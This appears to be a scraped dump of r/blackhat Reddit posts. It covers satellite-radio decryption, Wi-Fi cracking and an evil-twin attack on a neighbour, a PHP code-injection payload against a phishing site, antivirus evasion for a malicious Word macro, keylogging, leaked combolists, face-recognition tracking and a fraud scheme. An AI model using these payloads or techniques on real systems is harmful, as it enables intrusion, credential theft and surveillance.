Clearly this is designed for XM receivers in cars and homes that are built to unscramble the data and put together a complete XM broadcast with artist/album descriptors, but I’m interested in that process specifically, ie. how receivers decrypt the satellite radio signal. Normally you need an account with a paid subscription to access the radio, but that’s through a designated receiver, which I would assume has built methods of subscription verification that break the entire process if you don’t have an active subscription.

So my overarching question is why go down the route of accessing satellite radio through a paid subscription if the signal is broadcasted clearly on the 2.3Ghz band? Couldn’t you just build your own custom receiver to pick up the satellite signals (even if they are encrypted) and then reverse engineer an active radio (with an existing subscription) to figure out the decryption algorithm for the scrambled broadcasts?

I realize this might sound like a dumb or a newbie question, since there are millions of people using XM and I’m sure if it was this easy people might have already done it. It just makes no sense whatsoever to pay for radio that’s broadcasted on the entire globe. Maybe I’m not quite understanding some special thing that a factory XM receiver with a subscription does that a custom one couldn’t do- it’s just that the existence of a paywall for radio frequencies doesn’t make a whole lot of sense. Maybe someone can provide a better explanation of this or build off of these ideas..., idk I’m just putting it out here.",blackhat,1591428916,38,NA,https://www.reddit.com/r/blackhat/comments/gxmkln/decrypting_satellite_radio_signals/

5853,gy2rfm,boochman77,I'm currently getting back in to learning Pen Testing again the Kali Linux and one of the biggest issues i had was capturing packets and seeing different wireless networks around me i'm using the TP-LINK TL-WN722N. Recently i became friends with a couple of new neighbors on my block who are also into tech and i asked if could run some pen test on their networks to improve my skills. Problem is the tp link adapter can barely capture their packets or see the access point. I was wondering if i could upgrade the antenna for greater signal strength? If so what do yall recommend and what cables are needed to do so. I have a 100$ budget. So what would be the best long range antenna that i could hook up to my tp link adapter?,blackhat,1591491170,8,NA,https://www.reddit.com/r/blackhat/comments/gy2rfm/how_do_i_increase_adapter_strength/

5876,h0yucl,EONRaider,"If you intend to learn cybersecurity with Python, probably ""Violent  Python"" should be on your reading list. Being written almost 10 years ago doesn't help, though. That's why I decided to convert its code base to Python 3.

Some of the contents of the book cover how to program port scanners, reverse shells, your own  botnet command and control center, extract EXIF information from image files, instantiate an anonymous browser in Python and more.

This is a continuation to my previous work of conversion of ""Black Hat Python"" to Python 3. [Check it out](https://github.com/EONRaider/blackhat-python3) if you haven't done it yet.

This project wasn't easy. The code needed some serious efforts, but it's done. Enjoy.

5941,hhfl8l,WhoIsGoat,"I have asked this question about how credentials are stored in memory around and still have not gotten an answer so I will see if someone can answer it here but I doubt it.

When running Mimikatz on a domain joined workstation I had a question on how Mimikatz displays the MSV1_0 authentication package credentials. It is my understanding after doing some research that the MSV1_0 authentication package is not used to logon on to a domain joined workstation when a domain controller is reachable (kerberos is used). So how does it still display the NTLM hash even though MSV1_0 was not used to authenticate?

An example of both kerberos and MSV1_0 being displayed can be seen here:

5950,hjf28d,MQRedditor,"It goes like this:

* Get customer information (DOB, residence, etc)

* Call company and say you are an employee of XYZ company (something like a hospital or national bank) and give them an email address like johndoe@bankofamerica.com (the email doesn't exist but the domain has to be the actual domain of the company)

* Company says ""we sent you an authentication token, please tell us the token""

* Somehow gain access to token (???), tell them. Use customer information to fill out details and done.



I know someone who does this as their job literally, but he's secretive because he kind of has a monopoly. I really don't think he has access to the mobile plan company more than a normal person does.

There's also no way he has access to multiple different corporate emails.

Unless he's found some way to crack the tokens (if the company is dumb enough to generate it using people's names), I'm stumped.

Would be pretty impressive if it was social engineering, because he's doing this constantly. Maybe he's registered a similar sounding domain?",blackhat,1593625401,6,NA,https://www.reddit.com/r/blackhat/comments/hjf28d/how_does_this_scam_to_get_corporate_mobile_plans/

Hello all,

I could not think of another subreddit to post this to so here it is...

When browsing a friend's wedding registry on Amazon, I accidentally marked a gift as ""purchased."" So what's the big deal? Well, I had to wait close to an hour on the phone to speak with someone in registry to get them to unmark the item. I doubt many people are willing to call Amazon support to go through the task of getting them to unmark an item if it was an accident. This option cannot be undone by the end user, and once marked, the end user can no longer select the item as a gift for the registered address for the wedding registry.

============================================

Amazon allows you to search any and all upcoming and past wedding registries. I would think someone could easily program the ability to go through thousands of registries and mark every item as purchased and prevent newlyweds from receiving their desired items.

**TLDR: Amazon wedding registries are easily accessible and items can be marked as purchased with no verification. Potential to be mass manipulated.**",blackhat,1594583503,31,NA,https://www.reddit.com/r/blackhat/comments/hq0rqd/possibly_huge_development_oversight_in_amazon/

6029,hvuqcp,Th3L4stW4rP1g," 

Hello everyone. My gf received a phishing email by someone emulating the university login page. I have a limited experience, just with hack me websites, but wanted to mess around and see what I can do.

The website is a simple login page with email and password. When ""log-in"" is pressed, you are redirected to the actual login page without anything else happening. By looking at the html source I saw that once login is pressed, the event function links to a php file in an external domain. I tried accessing it but is locked. I then decided to try php injection. I started by inserting special characters (') and I did not receive any warnings.

I'm supposing the php file looks something like this:

Email &lt;?php echo $\\\_POST\\\[""Email""\\\]; ?&gt;&lt;br&gt;

Password: &lt;?php echo $\\\_POST\\\[""Passwd""\\\]; ?&gt;

I tried to insert a password so that I modify the code. To check if it works I was thinking of mailing myself on a trash email address I made:

Password: 1""\]; ?&gt; &lt;br&gt; mail([""francesco.giolitti69@gmail.com](mailto:%22francesco.giolitti69@gmail.com)"", ""Subject"", ""Hello world""); Email &lt;?php echo $\_POST\[""Email

My idea is that the code then becomes:

Email &lt;?php echo $\\\_POST\\\[""Email""\\\]; ?&gt;&lt;br&gt;

Password: &lt;?php echo $\\\_POST\\\[""1""\\\]; ?&gt; &lt;br&gt;

mail([""francesco.giolitti69@gmail.com](mailto:%22francesco.giolitti69@gmail.com)"", ""Subject"", ""Hello world"");

Email &lt;?php echo $\\\_POST\\\[""Email""\\\]; ?&gt;

I did not receive any email so I'm supposing that I either did something wrong or my code supposition is wrong. I was thinking that it is more likely for the php file to have a table instead of the simple thing I mentioned.

Is there anything else I can try? Do you have any tips for me?

I just downloaded Collection #1 and it has a lot of combolist of username and password. 

Is their a software that can maintain that huge list:

* Import combolist 
* Able to tag an entry to the original file
* Search for specific username or password
* Export combolist with certain criteria (like a word search etc.) 

If not, I'm planning to create my own app but what do you recommend as a database to use? Since I assumed the records it will hold will be at least on millions and if I use SQL then it might take hours just to do a simple search query (Just assuming, never tried this before)",blackhat,1598887915,2,NA,https://www.reddit.com/r/blackhat/comments/ik04nz/maintaining_and_searching_a_huge_combolist/

Still, I am learning new things every day. I am at the top 5k list of  Tryhackme players and at #570 in my nation, but I want to move on to    Hack the box.

So my question is, what things we should know/learn to start cracking machines/CTFs on Hack the box?

 Note:  I am not good in web app pentesting I know only HTML and basic  Javascript. I can read and understand the code, but can't write one.

6201,ix00p6,RedditsUnder,"dlWordPress.com is working with its advertisers to place links in the code of templates and plugins which unexpecting WordPress sites download through the dlWordPress.com site and their partners.

Even though the site / network has been outed by various bloggers, its still operating and it's plugin / template insertions are helping SEO spammers dominate Google.

Here are some examples:

https://stackoverflow.com/questions/42901355/malicious-text-appears-in-all-pages-and-posts-how-do-i-get-rid-of-it

https://www.xspdf.com/help/51748496.html

On the dlWordPress.com site itself, there is even a testimonial from RoyalCBD, one of their main clients:

A seamless, hassle free process working with Sergey and the rest of the team. They're quick to get started and have a no frills approach that keeps me sane – I'm so glad I made the switch. I have been working with Sergey and Vlad before they branded themselves and their services with the dlWordPress name and the relationship has saved me countless hours and headaches.
Justin Hamilton
Co-founder / Royal CBD

Essentially the way this dl program works is that unexpected companies download templates and plugins from this site and their partners which have backdoors that allow dlWordPress to insert their own links and the links of their advertisers on any blog or site using their plugins.

This is somewhat explained on their advertise page:

One of the world’s largest WordPress themes and plugin repositories, dlWordPress is proudly powered by our community. With more than 100,000 monthly active downloads on our themes, our users aren’t just casual observers of WordPress – they’re developers on the cutting edge of the latest web technology trends.
dlWordPress works with a few select clients every year to extend the reach of their brand’s services and message. Advertising slots are limited to 10 concurrent partners!
From dedicated email blasts to engaging custom features, reach out to find out how we can help you reach your marketing goals.
 
Here are examples of sites unknowingly linking to RoyalCBD through link insertions powered by dlWordPress:

6248,j6x79t,bionor,"I made a post in [another](https://www.reddit.com/r/privacy/comments/j6sb18/linux_how_to_verify_dns_over_https_is_working/) sub about how to do this, but perhaps not everyone there know so much about Wireshark, so I'm asking here as well. Please read the other post for full clarification.

I have a desktop machine and a Pi set up with pihole with DoH and I'm running Wireshark on my desktop to try and verify that everything is working as it should. When I run nslookup for instance, I can see the unencrypted DNS query going from my desktop to the Pi and from the Pi to my desktop, which is expected, but I can't see any traffic going from the Pi to the upstream DNS. Now the question is, \*shouldn't\* I?

Looking at EDR/MDR solutions and came across a new term XDR.

I came across an endpoint protection software called Cynet 360, which claims to be this all new XDR solution and seems to have all the bells and whistles.

6395,k4811j,crabzillax,"Hi.

I'm interested in auditing smart contracts. I've seen tools like Theo. They seem promising, but do you have any advice on this kind of test ? Not new to hacking, but new to blockchain hits.

I'd like to try these tools on a test environment before real auditing, and bug bounty. 

Any help ? Resources, keywords... And how important is Solidity understanding ? 

Thanks in advance.",blackhat,1606778481,32,NA,https://www.reddit.com/r/blackhat/comments/k4811j/hitting_blockchain/

6447,kfv8u5,Cringerella,"Let me know if there is a better subreddit to post this.

Hear me out here. A common targeted phishing scam to steal credentials involves:

1. Rip html/css of a website, then host it on a domain with a similar url
2. Target users and send them links to this fake website
3. Prompt users to log in to the fake website to farm credentials

Beyond reporting the domain to the registrar and crossing your fingers, not a lot can be done to stop this. Maybe warning users about the existence of the website.

But what if the fake website was flooded with fake credentials? This would need to be an effort distributed among different IP addresses. Each ""login"" attempt into the website would have a unique IP, and use a garbage username and password. The login attempts would roll in, feeding fake information to the website.

If the fake login attempts were indistinguishable from real users falling for the scam, the credentials collected by the website would end up being mostly garbage. Of course there are ways to check for the fake credentials, but with enough noise this could significantly reduce the effectiveness of these phishing scams.",blackhat,1608330554,27,NA,https://www.reddit.com/r/blackhat/comments/kfv8u5/hypothetical_antiphishing_scam_through/

Hey, I am trying to create a malicious Word file that will open a meterpreter shell when executed and macros enabled. Unfortunately it instantly gets detected by major Antivirus companies (McAffee, Malwarebytes, Windows Defender etc.) I tried hiding the malicious macro (created with [Unicorn](https://github.com/trustedsec/unicorn)) by stomping the VBA code with [EvilClippy](https://github.com/outflanknl/EvilClippy). Unfortunately it still got detected. I did try to use some other payloads than Unicorn and tweak the settings for EvilClippy but nothing really as helped. I’m a bit clueless now. Is there any payload that will make it less detectable by any means or is this kind of exploit/attack vector outdated and unusable?",blackhat,1609073839,43,NA,https://www.reddit.com/r/blackhat/comments/kl397m/trying_to_bypass_antivirus_with_malicious_word/

Termshark v2.2 features vim-key navigation, a cmdline, vim-style packet marks for jumping around pcaps and a themeable UI. It's written 100% in Go so compiles down to a single executable on each platform. The only prerequisite is that you have tshark installed. The website is https://termshark.io and you can find binaries for Linux, macOS, the BSD variants and Windows on github at https://github.com/gcla/termshark/releases. Hope you find it useful!

For some reason I cannot download Linux on my virtualbox so until then I was wondering if anyone could point me to a payload generator that works on windows (like veil or unicorn). I was also hoping it would be one that can use basic av evasion as I already have metasploit and msfvenom isn't much use.

6524,ku2ler,JeppNeb,"I don't know if this is the appropriate sub so foegive me if I am wrong. So I tried to learn the textbook way. Basically how one should get into hacking. I started using linux mint as a daily driver by dual booting into it when I won't need windows. Terminal usage isn't perfect (because I don't know what to do) but I totally got the gist of it. I then took a complete course on youtube about networking. I know how these technologies work or at least what they do (IP, NAT, ROUTERS, SWITCHES, TCP, UDP, ARP, MAC, HTTP, etc...). I then programmed my own backdoor to understand how it works in python. It was even cross platform and told me beforehand what the OS is so I can use the correct commands. Also other small things like a banner grabber, a script which automatically creates an account on a website for me, my own ARP Spoofer and so on. The next logical step was CTF's. I dtarted out with picoCTF. I got quite far pretty fast. I already know C programming basics so I also covered that one, as well as html, css. I still feel like I am going nowhere. My goal was to be able to write my own malware and also to be able to compromise systems online as well as offline. Where should I look into now ? I feel so stupid. I feel like a noob. I really put a lot of time into this.",blackhat,1610236422,33,NA,https://www.reddit.com/r/blackhat/comments/ku2ler/where_to_from_here/

6533,kwtcry,nintendowii111,Basically I have a galaxy s8 that has data on it that is important. It's asking for a pin with 4 or more digits. I have no idea what the google password for it is ( so cant use google to recover). Probably doesn't have USB debugging enabled. I have no idea what version of Android is on it. Is all hope lost or is there anything that can retrieve the data? Primarily SMS/text messages is what is needed. Assuming android 7 ( the original version when it was shipped) is still on it. Could that allow for some exploit? Thanks for any help.,blackhat,1610581876,0,NA,https://www.reddit.com/r/blackhat/comments/kwtcry/any_way_to_crack_galaxy_s8/

6575,l22mxk,DKMR,"Hi there, sorry if this is not the right sub to post this in.

I would like to patch a program I legally own to work without any license files. I can move the license file and the program will show an error message before the process is killed. The license file contains hardware information gathered with WQL, creates a hashed string from 7-8 parameters and validates it against a license file that's signed with X509 certificare afaik (magic header 30 82).

I want to ""capture"" the flow of execution with and without the license file, and another run from a VM which has a different hwid and then compare the results to see where they deviate. The exe's are about 600kb.

I have tried using tracing with x64dbg and ollydbg but can't get the results I want. Ideally I'd like to be able to see the diffs like on github where you can see highlights of things that changed, which would make this process a lot simpler.

Does anybody have a good tutorial or debugger which could aid me in this process?",blackhat,1611248791,14,NA,https://www.reddit.com/r/blackhat/comments/l22mxk/compare_licensed_and_unlicensed_execution_flow/

Anyone here have a recommended hardware list for a self-hosted database compilation?

I've been building my DB from various sources, many of which were initially pointed to by MB in his last couple of books.

Currently have Ubuntu 20.04 host system with 64 GB of RAM, in which I've been  trying to become fluent in running VirtualBox osint images as scripted  and outlined in the latest book.

My  issue is that as I download various DBs and try to unpack them from their various formats (rar, 7zip, zip, etc) things go....not great.   I've had my VM lock up multiple times and a couple of times the external drive has just kept running even after shutting down the VM.

Anyone have any tips/tricks/cheats/hints or whatever to help me out with this?   I've never worked with files as large or as widely arrayed in variety  as this.  I have html, txt, SQL, mdb, csv, and a bunch of other formats,  many of which I've never seen or operated/manipulated before.",blackhat,1612673115,2,NA,https://www.reddit.com/r/blackhat/comments/lefkpj/anyone_here_have_a_recommended_hardware_list_for/

6649,lqta5p,prroxy,"Hello folks, I am posting with the favor to ask here. 

&amp;#x200B;

Do you know the tool that it is publicly available or maybe you have the tool that you made by yourself that does have the following properties listed below

&amp;#x200B;

I am looking for initial phase recon tool that performs the following given:  IP or domain address.

&amp;#x200B;

1 Initial fast port scanning

2 The confirmed ports  needs to be scanned with Nmap

3 Additional subdomainfinder  flag, of course it would be nice if the results are nicely sorted into corresponding folders. 

4 Additional flag to find domains that belongs to the same server, if that result is &gt; then 2 domains it performs step 1 2and 3  to further expand the coverage.

5 It also would be nice to have additional flag that scans found domains and subdomains for technology insights such as server type, programming languages used etc.

&amp;#x200B;

So basically I am looking for stable initial reconnaissance tool that does 3 things well

1 It does the port scanning by using step one and 2

2 The tool must dig in deeper into new info as it is discovered until there is no new information available. 

3 The output results must be neatly organized.

&amp;#x200B;

I don't want anything complicated regarding the automatic exploitation and so on, I just want a tool that does reconnaissance and does it well. Some API integrations would be just a bonus, there are lots of half working or not well optimize scripts, so therefore I am looking for tested in the field initial reconnaissance tools.

&amp;#x200B;

This information is much more detailed on the repository page (link below). I'm looking for people to try the script out and report bugs to the issues section of the github.

6694,lzaw9s,DNAdeveloper-,"I'll explain the why below but as for the what:

I'm trying to gain administrator access to an account on a computer which is primarily signed into using a Microsoft account with an unknown remote access software. I've come to the conclusion that I need a key logger with admin rights so it won't be suspended when an admin password is used.

I was wondering if it would be possible to boot from a separate drive, install the key logger from the external drive onto the internal one and run it.

Or could it be easier to make a new admin account in this situation?

The why: its for fun. I'm friends with the it guy here and he reckons it would be impossible to get it to surf the internet. He welcomed me to see how far I can get. The computer is a pos and doesn't handle any sensetive data but it still needs to function properly.

My ultimate goal is to get access to windows firewall and disable the restrictions set in place. I already got Firefox on here.",blackhat,1615064085,3,NA,https://www.reddit.com/r/blackhat/comments/lzaw9s/install_applications_on_windows_by_booting_from/

6700,m1zq2g,PsykoAnon,"For the last year, I have been researching multiple wifi attack methods as a hobby. This might interest people with some of the constant questions regarding the topic...here's what I found...at some point ill do a full write up but for now...

Whilst testing multiple packets within aircrack, I placed the correct password within 10-word list files and ran them one by one.
Out of the 10 tested, only 3 returned the correct password.
Meh.
Hashcat was more efficient and quicker(3 days...1 trillion passwords tested).
Out of the 10 tested 6 returned the correct password.
Not bad
I also tested crunch and ran it through hashcat, 
Effective but slow...really...really slow.

I also assessed other methods of attack using the tools above but in general, I had no success...so we move on.

Fluxion the successor to the popular linset was my first obvious choice.
For this, I needed a victim (my next-door neighbour and also my friend) to allow me to access...i joked, telling him I would make him give me his password without actually give me his password. 
3 days later, I set up my wifi adapters plugged them in and started fluxion.

My adapters only run on 2.4 GHz, which I soon learned would be an issue.
My friend's wifi is 5 GHz, I knew for my attack to be productive I would either need to upgrade my hardware or get closer to his router and blast the absolute shit out of his network with deauth packets...ya know...just to make sure it works.
He was knocked offline but for some reason, the AP wouldn't start properly.
So taking my failure, I decided to create my own AP ready to capture credentials and began the 
deauthentication...it worked!!!
20 mins of rage because he couldn't get on COD allowed his anger to surpass his judgement and logic.

My take...

I spent roughly about 8 months using cracking tools and about 2-3 months with social engineering-based.
Pick the later before engaging with cracking. Humans are idiots and always assume you can break them before technology. 
If you don't know the password and attempt to crack it, you will presumably wait a very long time just to fail.
If you attempt to social engineer a password from a person, your success rate will be a lot higher.",blackhat,1615389313,47,NA,https://www.reddit.com/r/blackhat/comments/m1zq2g/wpawpa2_wifi_hackingyoull_probably_be_dead_before/

If we want to explore a person’s connections, track events he has taken part in, or find other photo-based information, we can upload a photo of his face (from LinkedIn or other sources) and then upload a bunch of photos or videos from events, meetings, conferences, social posts, and more, and automatically find all the photos he appears in and the people he interacts with. 

To use this feature on PC, go to [https://photos.google.com/search](https://photos.google.com/search), and you’ll see the faces it recognizes. By clicking on the relevant photo, will get all the photos he appears in. 

You can add a name to the target, to easily find all his content by searching his name. 

We can also try searching for a company name, and to get all the content it appears in (in signs, logos, etc.)

6843,mvpvmz,Goldtacto,"My friend has recently moved in with me. This started a few days ago when she apparently got multiple calls from me that I didn’t send out according to my phone history. Along with this when she answered the call, it would ring as if she dialed out. On my end it had looked like she had called me 7 times from her normal phone number (not her) and 3 times from facetime (actually her attempting to call me back).

Today we were in the same house and she had called me and I answered but nobody was on the line and once she checked her phone in person that she didnt dial from she was able to talk to me, but it sounded like it was distant even though we were next to eachother.

When she went through her call history it doesn’t display her calling me and a number that she had gotten called from previously that she thought was spam was my phone number with 2 digits swapped like, (123)-546-7890. Any advice on what’s happening here and if we should be concerned?

* SQL Injection Attacks and Defense by Justin Clarke (perhaps too specific)
* The Database Hacker's Handbook by David Litchfield (perhaps too dated)

My motivation for learning database hacking is that I'm interested in hacking, and I need to pass a rather uninteresting course on Databases for my computer science degree. It would be great if this hacking approach could trick me into learning more about relational databases and SQL.

If anyone have any recommendations, I would be very grateful. Books are preferred, but websites and courses are also ok.

6854,mxn1pf,NRockhouse,"I tweeted this question some time ago but my follower count isn't enough for anyone to be able to answer me, so I'll try this subreddit. Sorry if the question does not belong to this sub.

I'm looking for this article or paper that I read in 2019 about exfiltrating data via Windows Defender + JavaScript + IIS, something like that. It's about uploading a file with some JavaScript keywords and that will trigger Defender, and somehow it can be used to leak data. I don't remember the specifics, but the researcher made it into a CTF question, but has an unintended solution, so nobody solved it the way he intend.

By ""leak data"", it should be leaking data from another file, probably character by character. I really can't remember the specifics. I think he's using some Mimikatz string, like ""Invoke-Mimikatz.ps1"" (just the string, not the program itself) since Windows Defender is particularly sensitive about that string. So with some techniques, he can do ""Invoke-Mimikat"" + some magic code to leak a character in the file + "".ps1"" in JS and he'll get to know the character in the file is ""z"".

If I recall correctly it should be a PowerPoint slide or PDF. It's likely published last year, 2019, I read it on my phone while walking to a mall that time and now that I wanted to find it back, I couldn't Google it back anymore with any keywords or queries I can think of.

My memories are pretty fuzzy about this one, so some information may actually be false and may belong to some other article. But if anyone have any clue about something like this, let me know, thanks!

6965,nx2c4o,iSaraaah,"Hello everybody!
I want to introduce a project a few people and I have been working in lately, its name is AnonWorld and it is meant to be a completely free (as in free beer, that is, free of charge) hacking and programming virtual school that is mainly maintained by hacktivists from the anonymous collective.
It is pretty new - we have been working on this for less than one month - and it barely has content, there are two courses and there are going to be a lot of stuff other than just hacking, for example:

- Programming: from a beginner level to an advanced level - teaching low-level stuff such as operating system development.
- Hacking: learn hacking from real hackers, from people that are used to hack, this involves a lot of techniques, such as social engineering, anonymity, privacy, and so on.
- Computer science: learn how computers work, learn stuff like operating system and compilers design and - probably - a little course of implementation.
- Languages: yeah, why not, we are all from different parts of the world, we can teach the languages we all speak natively.

There's also a forum, so you can also learn from the other users of the platform, you can ask your questions there, you can start discussions and so much more.

If you want to check it, you can visit it with the following link: https://anonworld.eu

If you can support that would be so amazing, you can donate, you can be a teacher (you have to contact us and introduce yourself). Thank you for everything",blackhat,1623369682,82,NA,https://www.reddit.com/r/blackhat/comments/nx2c4o/a_completelyfree_as_in_free_beer_hacking_school/

6978,o2ke4x,InternetKidLK,"Recently I came across many web posts and YouTube videos about bypassing ISP given unlimited or content based internet packages such as Zoom only or Social Media only packages using an app called **HTTP Injector**. 

How is it done? Can anyone explain me in the most **easiest way**?

Also I need to know whether there are **other ways to do this kind of thing**. A tutorial or some kind of explanation would be great. 

Lastly, if there is know other way to do this then I would like to know how to **bypass ISP throttling** **without using any VPN** or such kind, because I am from a **3rd world country** my total bandwidth is 12 Mbps and if I were to use any VPN it would go to down as 2-4Mbps.",blackhat,1624005466,25,NA,https://www.reddit.com/r/blackhat/comments/o2ke4x/a_way_to_exploit_isp_unlimited_content_based/

I am doing research to identify if cybercrime increased due to the pandemic! I have created a survey to get some results from users who may have suffered a cyberattack!
